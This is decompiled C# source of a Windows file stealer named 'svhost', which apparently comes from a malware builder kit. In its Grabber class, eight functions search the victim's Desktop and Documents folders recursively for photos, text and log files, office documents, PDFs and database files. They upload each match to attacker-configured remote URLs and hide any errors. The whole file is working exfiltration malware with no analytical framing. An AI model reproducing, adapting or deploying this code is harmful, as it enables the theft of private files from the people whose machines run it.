// Decompiled with JetBrains decompiler
// Type: svhost.Grabber
// Assembly: svhost, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 7DC793DB-CF4C-4ECD-BC3A-2E8425BD618A
// Assembly location: C:\Users\matze\Desktop\Neuer Ordner (7)\Builder\Builder\Resources\svhost.exe

using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.FileIO;
using svhost.My;
using System;
using System.Collections.Generic;
using System.Net;
using System.Runtime.CompilerServices;
using System.Text;

namespace svhost
{
  [StandardModule]
  internal sealed class Grabber
  {
    public static string URL_CC1;
    public static string URL_CC2;
    public static string URL_CC3;
    public static string URL_CC4;
    public static string URL_CC5;
    public static string URL_CC6;
    public static string URL_CC7;
    public static string URL_CC8;

    public static void grab_photo_from_desktop(object URL_CC1)
    {
      try
      {
        try
        {
          foreach (string file in MyProject.Computer.FileSystem.GetFiles(MyProject.Computer.FileSystem.SpecialDirectories.Desktop, SearchOption.SearchAllSubDirectories, "*.jpg", "*.png", "*.gif", "*.bmp", "*.jpge"))
          {
            using (WebClient webClient1 = new WebClient())
            {
              WebClient webClient2 = webClient1;
              object[] objArray = new object[2]
              {
                RuntimeHelpers.GetObjectValue(URL_CC1),
                (object) file
              };
              object[] Arguments = objArray;
              bool[] flagArray = new bool[2]{ true, true };
              bool[] CopyBack = flagArray;
              object obj = NewLateBinding.LateGet((object) webClient2, (Type) null, "UploadFile", Arguments, (string[]) null, (Type[]) null, CopyBack);
              if (flagArray[0])
                URL_CC1 = RuntimeHelpers.GetObjectValue(objArray[0]);
              string str;
              if (flagArray[1])
                str = (string) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray[1]), typeof (string));
              str = Encoding.ASCII.GetString((byte[]) obj);
            }
          }
        }
        finally
        {
          IEnumerator<string> enumerator;
          enumerator?.Dispose();
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void grab_photo_from_Document(object URL_CC2)
    {
      try
      {
        try
        {
          foreach (string file in MyProject.Computer.FileSystem.GetFiles(MyProject.Computer.FileSystem.SpecialDirectories.MyDocuments, SearchOption.SearchAllSubDirectories, "*.jpg", "*.png", "*.gif", "*.bmp", "*.jpge"))
          {
            using (WebClient webClient1 = new WebClient())
            {
              WebClient webClient2 = webClient1;
              object[] objArray = new object[2]
              {
                RuntimeHelpers.GetObjectValue(URL_CC2),
                (object) file
              };
              object[] Arguments = objArray;
              bool[] flagArray = new bool[2]{ true, true };
              bool[] CopyBack = flagArray;
              object obj = NewLateBinding.LateGet((object) webClient2, (Type) null, "UploadFile", Arguments, (string[]) null, (Type[]) null, CopyBack);
              if (flagArray[0])
                URL_CC2 = RuntimeHelpers.GetObjectValue(objArray[0]);
              string str;
              if (flagArray[1])
                str = (string) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray[1]), typeof (string));
              str = Encoding.ASCII.GetString((byte[]) obj);
            }
          }
        }
        finally
        {
          IEnumerator<string> enumerator;
          enumerator?.Dispose();
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void grab_TXT_from_desktop(object URL_CC3)
    {
      try
      {
        try
        {
          foreach (string file in MyProject.Computer.FileSystem.GetFiles(MyProject.Computer.FileSystem.SpecialDirectories.Desktop, SearchOption.SearchAllSubDirectories, "*.txt", "*.log"))
          {
            using (WebClient webClient1 = new WebClient())
            {
              WebClient webClient2 = webClient1;
              object[] objArray = new object[2]
              {
                RuntimeHelpers.GetObjectValue(URL_CC3),
                (object) file
              };
              object[] Arguments = objArray;
              bool[] flagArray = new bool[2]{ true, true };
              bool[] CopyBack = flagArray;
              object obj = NewLateBinding.LateGet((object) webClient2, (Type) null, "UploadFile", Arguments, (string[]) null, (Type[]) null, CopyBack);
              if (flagArray[0])
                URL_CC3 = RuntimeHelpers.GetObjectValue(objArray[0]);
              string str;
              if (flagArray[1])
                str = (string) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray[1]), typeof (string));
              str = Encoding.ASCII.GetString((byte[]) obj);
            }
          }
        }
        finally
        {
          IEnumerator<string> enumerator;
          enumerator?.Dispose();
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void grab_TXT_from_Document(object URL_CC4)
    {
      try
      {
        try
        {
          foreach (string file in MyProject.Computer.FileSystem.GetFiles(MyProject.Computer.FileSystem.SpecialDirectories.MyDocuments, SearchOption.SearchAllSubDirectories, "*.txt", "*.log"))
          {
            using (WebClient webClient1 = new WebClient())
            {
              WebClient webClient2 = webClient1;
              object[] objArray = new object[2]
              {
                RuntimeHelpers.GetObjectValue(URL_CC4),
                (object) file
              };
              object[] Arguments = objArray;
              bool[] flagArray = new bool[2]{ true, true };
              bool[] CopyBack = flagArray;
              object obj = NewLateBinding.LateGet((object) webClient2, (Type) null, "UploadFile", Arguments, (string[]) null, (Type[]) null, CopyBack);
              if (flagArray[0])
                URL_CC4 = RuntimeHelpers.GetObjectValue(objArray[0]);
              string str;
              if (flagArray[1])
                str = (string) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray[1]), typeof (string));
              str = Encoding.ASCII.GetString((byte[]) obj);
            }
          }
        }
        finally
        {
          IEnumerator<string> enumerator;
          enumerator?.Dispose();
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void grab_docs_from_desktop(object URL_CC5)
    {
      try
      {
        try
        {
          foreach (string file in MyProject.Computer.FileSystem.GetFiles(MyProject.Computer.FileSystem.SpecialDirectories.Desktop, SearchOption.SearchAllSubDirectories, "*.doc", "*.docx", "*.pdf", "*.xlsx"))
          {
            using (WebClient webClient1 = new WebClient())
            {
              WebClient webClient2 = webClient1;
              object[] objArray = new object[2]
              {
                RuntimeHelpers.GetObjectValue(URL_CC5),
                (object) file
              };
              object[] Arguments = objArray;
              bool[] flagArray = new bool[2]{ true, true };
              bool[] CopyBack = flagArray;
              object obj = NewLateBinding.LateGet((object) webClient2, (Type) null, "UploadFile", Arguments, (string[]) null, (Type[]) null, CopyBack);
              if (flagArray[0])
                URL_CC5 = RuntimeHelpers.GetObjectValue(objArray[0]);
              string str;
              if (flagArray[1])
                str = (string) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray[1]), typeof (string));
              str = Encoding.ASCII.GetString((byte[]) obj);
            }
          }
        }
        finally
        {
          IEnumerator<string> enumerator;
          enumerator?.Dispose();
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void grab_docs_from_Document(object URL_CC6)
    {
      try
      {
        try
        {
          foreach (string file in MyProject.Computer.FileSystem.GetFiles(MyProject.Computer.FileSystem.SpecialDirectories.MyDocuments, SearchOption.SearchAllSubDirectories, "*.doc", "*.docx", "*.pdf", "*.xlsx"))
          {
            using (WebClient webClient1 = new WebClient())
            {
              WebClient webClient2 = webClient1;
              object[] objArray = new object[2]
              {
                RuntimeHelpers.GetObjectValue(URL_CC6),
                (object) file
              };
              object[] Arguments = objArray;
              bool[] flagArray = new bool[2]{ true, true };
              bool[] CopyBack = flagArray;
              object obj = NewLateBinding.LateGet((object) webClient2, (Type) null, "UploadFile", Arguments, (string[]) null, (Type[]) null, CopyBack);
              if (flagArray[0])
                URL_CC6 = RuntimeHelpers.GetObjectValue(objArray[0]);
              string str;
              if (flagArray[1])
                str = (string) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray[1]), typeof (string));
              str = Encoding.ASCII.GetString((byte[]) obj);
            }
          }
        }
        finally
        {
          IEnumerator<string> enumerator;
          enumerator?.Dispose();
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void grab_db_from_desktop(object URL_CC7)
    {
      try
      {
        try
        {
          foreach (string file in MyProject.Computer.FileSystem.GetFiles(MyProject.Computer.FileSystem.SpecialDirectories.Desktop, SearchOption.SearchAllSubDirectories, "*.sql", "*.bak", "*.db", "*.accdb"))
          {
            using (WebClient webClient1 = new WebClient())
            {
              WebClient webClient2 = webClient1;
              object[] objArray = new object[2]
              {
                RuntimeHelpers.GetObjectValue(URL_CC7),
                (object) file
              };
              object[] Arguments = objArray;
              bool[] flagArray = new bool[2]{ true, true };
              bool[] CopyBack = flagArray;
              object obj = NewLateBinding.LateGet((object) webClient2, (Type) null, "UploadFile", Arguments, (string[]) null, (Type[]) null, CopyBack);
              if (flagArray[0])
                URL_CC7 = RuntimeHelpers.GetObjectValue(objArray[0]);
              string str;
              if (flagArray[1])
                str = (string) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray[1]), typeof (string));
              str = Encoding.ASCII.GetString((byte[]) obj);
            }
          }
        }
        finally
        {
          IEnumerator<string> enumerator;
          enumerator?.Dispose();
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void grab_db_from_Document(object URL_CC8)
    {
      try
      {
        try
        {
          foreach (string file in MyProject.Computer.FileSystem.GetFiles(MyProject.Computer.FileSystem.SpecialDirectories.MyDocuments, SearchOption.SearchAllSubDirectories, "*.sql", "*.bak", "*.db", "*.accdb"))
          {
            using (WebClient webClient1 = new WebClient())
            {
              WebClient webClient2 = webClient1;
              object[] objArray = new object[2]
              {
                RuntimeHelpers.GetObjectValue(URL_CC8),
                (object) file
              };
              object[] Arguments = objArray;
              bool[] flagArray = new bool[2]{ true, true };
              bool[] CopyBack = flagArray;
              object obj = NewLateBinding.LateGet((object) webClient2, (Type) null, "UploadFile", Arguments, (string[]) null, (Type[]) null, CopyBack);
              if (flagArray[0])
                URL_CC8 = RuntimeHelpers.GetObjectValue(objArray[0]);
              string str;
              if (flagArray[1])
                str = (string) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray[1]), typeof (string));
              str = Encoding.ASCII.GetString((byte[]) obj);
            }
          }
        }
        finally
        {
          IEnumerator<string> enumerator;
          enumerator?.Dispose();
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
  }
}
